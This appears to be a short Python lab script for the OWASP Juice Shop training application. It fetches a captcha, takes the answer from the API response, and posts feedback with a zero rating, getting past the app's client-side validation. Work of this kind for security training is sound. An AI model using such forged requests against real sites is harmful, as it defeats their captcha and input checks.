import requests

juice_shop_url="https://juice-shop-kha.herokuapp.com/"

capcha_response = requests.get(juice_shop_url + "rest/captcha")

capcha_data = capcha_response.json()

no_rating_feedback = {
            "captchaId": capcha_data['captchaId'],
            "comment": "This is my comment",
            "captcha": capcha_data['answer'],
            "rating": 0
        }

no_rating_request = requests.post(juice_shop_url + "/api/Feedbacks", json=no_rating_feedback)

print(no_rating_request.json())
